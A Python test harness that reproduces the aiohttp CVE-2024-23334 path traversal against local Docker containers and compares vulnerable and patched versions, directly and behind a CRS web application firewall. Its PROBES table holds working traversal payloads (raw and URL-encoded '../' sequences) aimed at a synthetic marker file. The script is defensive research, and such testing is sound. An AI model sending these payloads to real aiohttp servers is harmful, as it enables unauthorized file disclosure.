"""Reproduce aiohttp CVE-2024-23334 on Docker loopback using synthetic marker.

No scanning. Never accepts arbitrary target URLs. Both direct and CRS-mediated
responses plus patched control and proxy behavior are preserved.
"""
from __future__ import annotations
import argparse
from datetime import datetime,timezone
import http.client
import json
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
import common as c

CASE_ROOT=c.CP/'cve-2024-23334'
CASE_DIR=Path(__file__).resolve().parent/'cve_lab'
COMPOSE=['docker','compose','-f','checkpoint_tools/cve_lab/compose.yaml']
MARKER='TRACE_CVE_2024_23334_SYNTHETIC_MARKER\n'
PUBLIC='TRACE_CVE_PUBLIC_OK\n'
PORTS={'vuln_direct':18190,'fixed_direct':18191,'vuln_waf':18192,'fixed_waf':18193}
PROBES={
    'raw_dotdot':'/static/../trace-only-cve-marker.txt',
    'encoded_dotdot':'/static/%2e%2e/trace-only-cve-marker.txt',
    'encoded_slash':'/static/..%2ftrace-only-cve-marker.txt',
}


def send(port,path,request_id):
    conn=http.client.HTTPConnection('127.0.0.1',port,timeout=10)
    started=time.monotonic()
    try:
        # putrequest sends the HTTP request target literally (no client path normalization).
        conn.putrequest('GET',path,skip_accept_encoding=True)
        conn.putheader('X-Trace-Request',request_id)
        conn.putheader('Connection','close')
        conn.endheaders()
        r=conn.getresponse()
        raw=r.read(65536)
        body=raw.decode('utf-8',errors='replace')
        return {'status':r.status,'body':body[:5000],
                'body_sha256':c.sha(raw),
                'marker_disclosed':body==MARKER,
                'backend_request_id':r.getheader('X-Trace-Request'),
                'content_type':r.getheader('Content-Type'),
                'elapsed_ms':round((time.monotonic()-started)*1000,3)}
    except (OSError,TimeoutError,http.client.HTTPException) as exc:
        return {'error':type(exc).__name__, 'elapsed_ms':round((time.monotonic()-started)*1000,3)}
    finally:
        conn.close()


def wait_meta(port,expect,timeout=100):
    deadline=time.monotonic()+timeout
    while time.monotonic()<deadline:
        r=send(port,'/meta',f'trace-cve-health-{expect}')
        if r.get('status')==200:
            try:
                meta=json.loads(r['body'])
                if meta.get('version')==expect and meta.get('product')=='aiohttp':
                    return meta
            except ValueError:
                pass
        time.sleep(2)
    raise RuntimeError(f'Localhost port {port} does not identify exact aiohttp {expect}.')


def correlate(logtext,trace_id):
    """Conservatively detect a correlated CRS audit transaction, not generic 403."""
    for line in logtext.splitlines():
        start=line.find('{"transaction":')
        if start<0:
            continue
        try:
            event=json.loads(line[start:])
        except ValueError:
            continue
        if not isinstance(event,dict): continue
        req=event.get('request',{}).get('headers',{})
        rid=req.get('X-Trace-Request') or req.get('x-trace-request')
        if rid!=trace_id: continue
        response=event.get('response',{})
        messages=event.get('messages',[])
        rule_ids=[]
        for message in messages:
            details=message.get('details',{}) if isinstance(message,dict) else {}
            rule_id=details.get('ruleId') or details.get('rule_id')
            if rule_id is not None: rule_ids.append(str(rule_id))
        return {'matched_transaction':True, 'audit_status':response.get('http_code'),
                'rule_ids':rule_ids,'crs_949110': '949110' in rule_ids}
    return {'matched_transaction':False,'crs_949110':False}


def run():
    c.docker_ready()
    CASE_ROOT.mkdir(parents=True,exist_ok=True)
    folder=CASE_ROOT/datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S%fZ')
    folder.mkdir(exist_ok=False)
    summary={'case_id':'CVE-2024-23334','scope':'CWE-22 single aiohttp case study',
        'utc':c.now(),'status':'INCOMPLETE','source_advisory':'https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f',
        'affected_version':'3.9.1','patched_version':'3.9.2',
        'condition':'follow_symlinks=True in aiohttp static route',
        'real_secrets_used':False,'external_target_probed':False,
        'compose_sha256':c.digest_path(CASE_DIR/'compose.yaml'),
        'dockerfile_sha256':c.digest_path(CASE_DIR/'Dockerfile'),
        'server_sha256':c.digest_path(CASE_DIR/'server.py'),
        'records':[], 'limitations':[]}
    started=False
    try:
        c.write_json(folder/'initial-metadata.json',c.environment())
        build=c.command(COMPOSE+['up','-d','--build'],folder/'docker-up.json',timeout=600)
        started=True
        c.require(build.get('exit_code')==0,'Local Docker build/start failed. See docker-up.json')
        metas={name:wait_meta(port,'3.9.1' if name.startswith('vuln') else '3.9.2')
               for name,port in PORTS.items()}
        summary['runtime_versions']=metas
        c.write_json(folder/'images.json',c.command(COMPOSE+['images','--format','json']))
        for label,path in [('public_document','/static/public.txt')]+list(PROBES.items()):
            for route,port in PORTS.items():
                reqid=f'trace-cve-{label}-{route}'
                record={'label':label,'request_path':path,'connection':route,'port':port,
                        'request_id':reqid,'result':send(port,path,reqid)}
                if label=='public_document':
                    record['expected_public_content']=record['result'].get('body')==PUBLIC
                summary['records'].append(record)
        for service in ('waf-vuln','waf-fixed','vuln','fixed'):
            c.write_json(folder/(service+'-logs.json'),c.command(
                COMPOSE+['logs','--no-color',service],timeout=50))
        logs={service:c.read_json(folder/(service+'-logs.json')).get('stdout','')
              for service in ('waf-vuln','waf-fixed')}
        for r in summary['records']:
            if r['connection']=='vuln_waf':
                r['waf_log_correlation']=correlate(logs['waf-vuln'],r['request_id'])
            elif r['connection']=='fixed_waf':
                r['waf_log_correlation']=correlate(logs['waf-fixed'],r['request_id'])
        pairs={(r['label'],r['connection']):r['result'] for r in summary['records']}
        controls_good=all(pairs[('public_document',label)].get('body')==PUBLIC for label in PORTS)
        disclosed=[label for label in PROBES if pairs[(label,'vuln_direct')].get('marker_disclosed')]
        patched_disclosure=[label for label in PROBES if pairs[(label,'fixed_direct')].get('marker_disclosed')]
        summary['vulnerable_direct_marker_disclosed_on']=disclosed
        summary['patched_direct_marker_disclosed_on']=patched_disclosure
        summary['public_controls_passed']=controls_good
        summary['cve_reproduction_confirmed']=bool(controls_good and disclosed and not patched_disclosure)
        outcomes={}
        for label in PROBES:
            direct=pairs[(label,'vuln_direct')]
            via=pairs[(label,'vuln_waf')]
            audit=next((r.get('waf_log_correlation',{}) for r in summary['records']
                        if r['label']==label and r['connection']=='vuln_waf'),{})
            if not direct.get('marker_disclosed'):
                status='DIRECT_ORACLE_NOT_EFFECTIVE'
            elif via.get('marker_disclosed'):
                status='WAF_BYPASS_EFFECT_OBSERVED'
            elif (via.get('status')==403 and audit.get('crs_949110')):
                status='WAF_BLOCK_CORROBORATED_BY_CRS_LOG'
            else:
                status='WAF_OR_PROXY_DIFFERENCE_INCONCLUSIVE'
            outcomes[label]=status
        summary['waf_per_probe']=outcomes
        summary['conclusive_waf_probes'] = [key for key,value in outcomes.items()
            if value in ('WAF_BLOCK_CORROBORATED_BY_CRS_LOG','WAF_BYPASS_EFFECT_OBSERVED')]
        if summary['cve_reproduction_confirmed'] and summary['conclusive_waf_probes']:
            summary['status']='EVALUATED_WITH_WAF_EVIDENCE'
        elif summary['cve_reproduction_confirmed']:
            summary['status']='DIRECT_CONFIRMED_WAF_INCONCLUSIVE'
        else:
            summary['status']='REPRODUCTION_NOT_CONFIRMED'
        summary['limitations']=[
           'Synthetic canary only; no actual secret or third-party product.',
           'One CWE-22 case study; not generalizable to other CVEs.',
           'Proxy URI normalization and PROXY_ERROR_OVERRIDE may change responses.',
           'WAF prevention requires CRS audit correlation, not HTTP status alone.',
           'Separate Docker service versions do not prove identity with existing TRACE-WAF fixture.']
    except Exception as exc:
        summary['error']=f'{type(exc).__name__}: {exc}'
        summary['status']='INCOMPLETE'
    finally:
        if started:
            for service in ('waf-vuln','waf-fixed','vuln','fixed'):
                path=folder/(service+'-logs.json')
                if not path.exists():
                    c.write_json(path,c.command(COMPOSE+['logs','--no-color',service],timeout=45))
            summary['cleanup']=c.command(COMPOSE+['down','--remove-orphans'],
                folder/'docker-down.json',timeout=150)
        c.write_json(folder/'cve-summary.json',summary)
    print(json.dumps({'status':summary['status'],'direct_vulnerable_proof':summary.get('vulnerable_direct_marker_disclosed_on'),
                      'fixed_control_leak':summary.get('patched_direct_marker_disclosed_on'),
                      'waf':summary.get('waf_per_probe'),
                      'evidence_path':str(folder)},ensure_ascii=False,indent=2))
    return 0 if summary['status']=='EVALUATED_WITH_WAF_EVIDENCE' else 3


if __name__=='__main__':
    p=argparse.ArgumentParser(description=__doc__)
    p.add_argument('--run',required=True,action='store_true',help='Explicitly run local Docker CVE case study')
    args=p.parse_args()
    sys.exit(run())
